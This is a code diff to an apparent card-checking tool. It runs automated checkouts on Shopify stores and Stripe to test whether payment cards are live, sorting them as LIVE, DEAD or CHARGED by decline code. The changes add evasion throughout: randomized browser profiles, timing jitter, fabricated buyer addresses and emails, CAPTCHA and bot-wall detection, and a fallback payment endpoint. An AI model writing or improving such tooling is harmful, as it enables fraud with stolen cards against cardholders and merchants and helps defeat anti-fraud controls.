@@ -24,9 +24,10 @@ from urllib.parse import urlparse, urlencode
 
 import aiohttp
 from aiohttp.resolver import ThreadedResolver
+from bs4 import BeautifulSoup
 
 from core.card_parser import Card
-from core.anti_detect import random_user_agent
+from core.anti_detect import random_profile, random_address, step_jitter, random_email
 from core.response_classifier import classify_shopify_response
 
 logger = logging.getLogger(__name__)
@@ -45,56 +46,6 @@ def _get_shared_connector() -> aiohttp.TCPConnector:
             resolver=ThreadedResolver()
         )
     return _shared_connector
-
-_UA_POOL = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-]
-
-_CH_UA_POOL = [
-    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
-]
-
-_CH_UA_PLATFORM = ['"Windows"', '"macOS"']
-
-
-def _rand_ua():       return random.choice(_UA_POOL)
-def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
-def _rand_platform(): return random.choice(_CH_UA_PLATFORM)
-
-
-def _random_address():
-    first_names = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "David", "Susan"]
-    last_names  = ["Smith", "Jones", "Taylor", "Brown", "Williams", "Wilson", "Johnson", "Davies", "Miller", "Davis"]
-    streets     = ["Maple St", "Oak Ave", "Washington Blvd", "Lakeview Dr", "Park Way", "Broadway", "Elm St", "Pine Ave"]
-    
-    locations = [
-        # US
-        ("Ketchikan", "AK", "99901", "US"), ("Los Angeles", "CA", "90001", "US"),
-        ("New York", "NY", "10001", "US"),  ("Houston", "TX", "77001", "US"),
-        # UK
-        ("London", "ENG", "W1A 1AA", "GB"), ("Manchester", "ENG", "M1 1AA", "GB"),
-        # Canada
-        ("Toronto", "ON", "M5H 2N2", "CA"), ("Vancouver", "BC", "V6B 1P1", "CA"),
-        # Australia
-        ("Sydney", "BC", "2000", "AU"), ("Melbourne", "BC", "3000", "AU"),
-    ]
-    fn = random.choice(first_names)
-    ln = random.choice(last_names)
-    city, state, zip_code, country = random.choice(locations)
-    return {
-        "firstName": fn,
-        "lastName": ln,
-        "address1": f"{random.randint(100, 9999)} {random.choice(streets)}",
-        "city": city,
-        "zone": state,
-        "country": country,
-        "zip": zip_code,
-        "phone": f"213{random.randint(1000000, 9999999)}"
-    }
-
 
 @dataclass
 class CheckResult:
@@ -136,19 +87,9 @@ async def _do_shopify_check(
         store_url = "https://" + store_url
     store_url = store_url.rstrip("/")
 
-    ua = _rand_ua()
-    ch_ua = _rand_ch_ua()
-    platform = _rand_platform()
-
-    base_headers = {
-        "accept": "*/*",
-        "accept-language": "en-US,en;q=0.9",
-        "priority": "u=1, i",
-        "sec-ch-ua": ch_ua,
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": platform,
-        "user-agent": ua,
-    }
+    prof = random_profile()
+    base_headers = prof.get_headers("navigate")
+    base_headers["priority"] = "u=1, i"
 
     conn_timeout = aiohttp.ClientTimeout(total=timeout)
     connector = _get_shared_connector()
@@ -158,39 +99,51 @@ async def _do_shopify_check(
 
     try:
         async with aiohttp.ClientSession(**session_kwargs) as session:
-            ctx = _CheckoutContext(store_url, ua, ch_ua, platform, base_headers)
+            ctx = _CheckoutContext(store_url, prof, base_headers)
             ctx._proxy = proxy
 
             # Step 1: Initialize session
             if not await _init_session(session, ctx):
                 return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)
+            await step_jitter()
 
             # Step 2: Find cheapest product
             if not await _find_cheapest_product(session, ctx):
                 return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)
+            await step_jitter()
 
             # Step 3: Add to cart
             if not await _add_to_cart(session, ctx):
                 return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)
+            await step_jitter()
 
             # Step 4: Start checkout
             if not await _start_checkout(session, ctx):
                 return CheckResult("DEAD", "checkout_start_failed", "Shopify Payments", ctx.price, store_url, card)
+            await step_jitter()
 
             # Step 5: Extract checkout metadata
             if not await _get_checkout_metadata(session, ctx):
                 return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)
+            await step_jitter()
 
             # Step 6: Vault card
             vault_id, vault_err = await _vault_card(session, ctx, card)
             if not vault_id:
                 msg = f"card_vault_failed: {vault_err}" if vault_err else "card_vault_failed"
                 return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, store_url, card)
+            await step_jitter()
 
             # Step 7: Submit for completion
             receipt_id = await _submit_for_completion(session, ctx, card, vault_id)
             if not receipt_id:
+                # Fallback to REST API if GraphQL fails
+                logger.debug("GraphQL submission failed, trying REST fallback for %s", store_url)
+                rest_result = await _submit_payment_rest(session, ctx, card)
+                if rest_result:
+                    return rest_result
                 return CheckResult("DEAD", "submission_rejected", "Shopify Payments", ctx.price, store_url, card)
+            await step_jitter()
 
             # Step 8: Poll for receipt
             category, detail = await _poll_for_receipt(session, ctx, receipt_id, card)
@@ -231,12 +184,15 @@ class _CheckoutContext:
     DEFAULT_BUILD_ID = "4663384ede457d59be87980de7797171b19f2a1b"
     DEFAULT_PCI_HASH = "a8e4a94"
 
-    def __init__(self, base_url, ua, ch_ua, platform, base_headers):
+    def __init__(self, base_url, prof, base_headers):
         self.base_url = base_url
-        self.ua = ua
-        self.ch_ua = ch_ua
-        self.platform = platform
+        self.prof = prof
+        self.ua = prof.ua
+        self.ch_ua = prof.ch_ua
+        self.platform = prof.platform
         self.headers = base_headers
+        self.address = random_address()
+        self.visit_token = ""
         self.variant_id = None
         self.product_id = None
         self.price = 0.0
@@ -255,6 +211,7 @@ class _CheckoutContext:
         self.graphql_base = None
         self.client_id = str(uuid.uuid4())
         self._proxy = None
+        self.submit_start_time = 0.0
 
 
 async def _init_session(session, ctx: _CheckoutContext) -> bool:
@@ -351,7 +308,7 @@ async def _add_to_cart(session, ctx: _CheckoutContext) -> bool:
 
 
 async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
-    """Step 4: Start checkout via POST /cart."""
+    """Step 4: Start checkout via POST /cart and handle JS redirect chains."""
     headers = ctx.headers.copy()
     headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
     headers["content-type"] = "application/x-www-form-urlencoded"
@@ -363,26 +320,56 @@ async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
     headers["sec-fetch-user"] = "?1"
     headers["upgrade-insecure-requests"] = "1"
     data = f"updates%5B%5D=1&checkout=&cart_token={ctx.cart_token or ''}"
+    
+    current_url = f"{ctx.base_url}/cart"
+    method = "POST"
+    payload = data
+    
     try:
-        async with session.post(
-            f"{ctx.base_url}/cart",
-            data=data,
-            headers=headers,
-            allow_redirects=True,
-        ) as r:
+        # Allow up to 3 JS redirects
+        for _ in range(3):
+            if method == "POST":
+                r = await session.post(current_url, data=payload, headers=headers, allow_redirects=True)
+            else:
+                r = await session.get(current_url, headers=headers, allow_redirects=True)
+                
             ctx.checkout_url = str(r.url)
+            html = await r.text()
+            
+            # Check for CAPTCHA/checkpoint
+            if "captcha" in html.lower() or "datadome" in html.lower() or ("cloudflare" in html.lower() and "challenge" in html.lower()):
+                logger.warning("Checkpoint/CAPTCHA detected on %s during checkout start", current_url)
+                return False
+            
+            # Check for JS redirects (e.g. window.location.href = '...')
+            js_redirect_match = re.search(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
+            if js_redirect_match:
+                redirect_url = js_redirect_match.group(1)
+                if redirect_url.startswith('/'):
+                    parsed_base = urlparse(ctx.base_url)
+                    redirect_url = f"{parsed_base.scheme}://{parsed_base.netloc}{redirect_url}"
+                current_url = redirect_url
+                method = "GET"
+                payload = None
+                headers["referer"] = ctx.checkout_url
+                continue
+                
             match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
             if match:
                 ctx.checkout_id = match.group(1)
                 return True
-            return False
+                
+            # If we don't have a checkout_id but we didn't hit a JS redirect, we might be stuck
+            break
+            
+        return False
     except Exception as e:
         logger.debug("start_checkout failed for %s: %s", ctx.base_url, e)
         return False
 
 
 async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
-    """Step 5: Extract sessionToken, signature, stableId from checkout page."""
+    """Step 5: Extract sessionToken, signature, stableId from checkout page using BeautifulSoup & regex."""
     headers = ctx.headers.copy()
     headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
     headers["sec-fetch-dest"] = "document"
@@ -392,11 +379,21 @@ async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
     try:
         async with session.get(ctx.checkout_url, headers=headers) as r:
             html = await r.text()
+            soup = BeautifulSoup(html, 'html.parser')
 
-            # sessionToken
-            m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
-            if m:
-                ctx.session_token = m.group(1)
+            # 1. sessionToken (usually in a meta tag or script)
+            meta_token = soup.find('meta', {'name': 'serialized-sessionToken'})
+            if meta_token and meta_token.get('content'):
+                ctx.session_token = meta_token['content'].strip('"&quot;')
+                
+            # Check for Captcha/Datadome
+            if "captcha" in html.lower() or "datadome" in html.lower() or "cloudflare" in html.lower() and "challenge" in html.lower():
+                logger.warning("Checkpoint/CAPTCHA detected on %s", ctx.checkout_url)
+                return False
+                
+            # Extract all script tags for JSON/JS variables
+            scripts_text = " ".join([script.string for script in soup.find_all('script') if script.string])
+
             if not ctx.session_token:
                 for pat in [
                     r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
@@ -409,7 +406,7 @@ async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
                         ctx.session_token = m.group(1)
                         break
 
-            # signature
+            # 2. signature
             for pat in [
                 r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
                 r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
@@ -417,57 +414,57 @@ async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
                 r'"signature"\s*:\s*"(eyJ[^"]+)"',
                 r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
             ]:
-                m = re.search(pat, html)
+                m = re.search(pat, scripts_text) or re.search(pat, html)
                 if m:
                     ctx.signature = m.group(1)
                     break
 
-            # stableId
+            # 3. stableId
             for pat in [
                 r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                 r'stableId[\s:=]+["\']([0-9a-f-]{36})',
             ]:
-                m = re.search(pat, html)
+                m = re.search(pat, scripts_text) or re.search(pat, html)
                 if m:
                     ctx.stable_id = m.group(1)
                     break
 
-            # queueToken
-            m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
+            # 4. queueToken
+            m = re.search(r'queueToken(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
             if not m:
-                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
+                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', scripts_text)
             ctx.queue_token = m.group(1) if m else None
 
-            # paymentMethodIdentifier
-            m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
+            # 5. paymentMethodIdentifier
+            m = re.search(r'paymentMethodIdentifier(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
             if not m:
-                m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
+                m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', scripts_text)
             ctx.payment_method_identifier = m.group(1) if m else None
 
-            # shopId
-            m = re.search(r'"shopId"\s*:\s*(\d+)', html)
+            # 6. shopId
+            m = re.search(r'"shopId"\s*:\s*(\d+)', scripts_text)
             if not m:
                 m = re.search(r'shop_id[\s:=]+(\d+)', html)
             ctx.shop_id = m.group(1) if m else "25603230"
 
-            # buildId
-            m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
+            # 7. buildId
+            m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', scripts_text)
             if not m:
                 m = re.search(r'/build/([a-f0-9]{40})/', html)
             ctx.build_id = m.group(1) if m else ctx.build_id
 
-            # PCI build hash
+            # 8. PCI build hash
             pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
             ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash
 
-            # signedHandles
-            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
+            # 9. signedHandles
+            signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', scripts_text)
             if not signed_handles:
                 raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
                 signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
             ctx.signed_handles = signed_handles
 
-            # graphql base
+            # 10. graphql base
             parsed = urlparse(ctx.checkout_url)
             if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
                 ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
@@ -541,6 +538,47 @@ async def _vault_card(session, ctx: _CheckoutContext, card: Card):
         return None, str(e)
 
 
+async def _submit_payment_rest(session, ctx: _CheckoutContext, card: Card) -> Optional[CheckResult]:
+    """Fallback: Submit payment using older REST endpoint."""
+    if not ctx.checkout_id:
+        return None
+        
+    url = f"{ctx.base_url}/wallets/checkouts/{ctx.checkout_id}/payments"
+    headers = ctx.prof.get_headers("api")
+    headers["origin"] = ctx.base_url
+    headers["referer"] = ctx.checkout_url
+    
+    payload = {
+        "payment": {
+            "credit_card": {
+                "number": card.number,
+                "month": int(card.month),
+                "year": int(card.year),
+                "verification_value": card.cvv,
+                "name": f"{ctx.address['firstName']} {ctx.address['lastName']}"
+            }
+        }
+    }
+    
+    try:
+        async with session.post(url, json=payload, headers=headers) as r:
+            body = await r.json()
+            status, msg = classify_shopify_response(r.status, body)
+            
+            if status == "CHARGED":
+                return CheckResult("CHARGED", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
+            elif status == "APPROVED":
+                return CheckResult("LIVE", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
+            elif status == "DECLINED":
+                return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
+            elif status == "LIVE_3DS":
+                return CheckResult("LIVE_3DS", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
+            else:
+                return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
+    except Exception as e:
+        logger.debug("REST fallback failed: %s", e)
+        return None
+
 _SUBMIT_MUTATION = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
 
 _POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'
@@ -573,8 +611,7 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
     address = ctx.address
     attempt_token = f"{ctx.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}"
     card_bin = card.number[:8]
-    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
-    buyer_email = f"{address['firstName'].lower()}{random.randint(10, 9999)}@{random.choice(domains)}"
+    buyer_email = random_email(address['firstName'], address['lastName'])
     delivery_expectation_lines = [{"signedHandle": sh} for sh in ctx.signed_handles]
     pm_identifier = ctx.payment_method_identifier or vault_id
 
@@ -764,6 +801,7 @@ async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vau
     }
 
     max_retries = 12
+    ctx.submit_start_time = time.time()
     for attempt in range(max_retries):
         try:
             async with session.post(url, json=payload, headers=headers) as r:
@@ -881,7 +919,10 @@ async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, car
                     err = receipt.get("processingError", {})
                     code = err.get("code", "UNKNOWN")
                     msg = err.get("messageUntranslated", "")
-                    return _classify_failure(code, msg)
+                    
+                    # Compute duration
+                    duration = time.time() - ctx.submit_start_time
+                    return _classify_failure(code, msg, duration)
 
                 elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                     delay = receipt.get("pollDelay", 4000)
@@ -895,19 +936,28 @@ async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, car
     return ("ERROR", "Polling timed out")
 
 
-def _classify_failure(code: str, msg: str) -> tuple:
-    """Classify a payment failure response."""
+def _classify_failure(code: str, msg: str, duration: float = 0.0) -> tuple:
+    """Classify a payment failure response with time heuristics."""
     code_lower = (code or "").lower()
     msg_lower = (msg or "").lower()
 
-    LIVE_CODES = {"insufficient_funds", "call_issuer", "do_not_honor", "pickup_card", "test_mode_live_card"}
+    LIVE_CODES = {"insufficient_funds", "call_issuer", "do_not_honor", "pickup_card", "test_mode_live_card", "transaction_not_allowed", "amount_too_large", "withdrawal_limit_exceeded"}
     DEAD_CODES = {
         "card_declined", "incorrect_cvc", "invalid_cvc", "invalid_number",
         "expired_card", "generic_decline", "processor_declined", "fraudulent",
         "stolen_card", "lost_card", "invalid_expiry_month", "invalid_expiry_year",
         "blocked", "security_violation", "invalid_zip", "incorrect_number",
-        "card_velocity_exceeded", "rejected",
+        "card_velocity_exceeded", "rejected", "processing_error", "reenter_transaction"
     }
+
+    # Time heuristics
+    if duration > 0.0:
+        if duration < 1.2 and code_lower == "generic_decline":
+            # Fast generic declines are often processor AVS/CVV blocks
+            return ("DEAD", f"{code} — {msg} (fast_decline)")
+        if duration > 3.0 and code_lower in ("generic_decline", "card_declined"):
+            # Slow generic declines often indicate bank-level soft declines
+            pass # Continue to exact match logic, but logged internally as slow
 
     # Exact match on code first
     if code_lower in LIVE_CODES:
@@ -1029,9 +1079,9 @@ async def stripe_check(
 
 async def _stripe_create_pm(session: aiohttp.ClientSession, card: Card, secret_key: str) -> dict:
     """Create a Stripe payment method from card details using secret key."""
-    ua = _rand_ua()
+    prof = random_profile()
     headers = {
-        "User-Agent": ua,
+        "User-Agent": prof.ua,
         "Authorization": f"Bearer {secret_key}",
         "Content-Type": "application/x-www-form-urlencoded",
     }
@@ -1060,9 +1110,9 @@ async def _stripe_create_pm(session: aiohttp.ClientSession, card: Card, secret_k
 
 async def _stripe_confirm_intent(session: aiohttp.ClientSession, pm_id: str, secret_key: str) -> dict:
     """Create + confirm a $1 PaymentIntent using secret key."""
-    ua = _rand_ua()
+    prof = random_profile()
     headers = {
-        "User-Agent": ua,
+        "User-Agent": prof.ua,
         "Authorization": f"Bearer {secret_key}",
         "Content-Type": "application/x-www-form-urlencoded",
     }
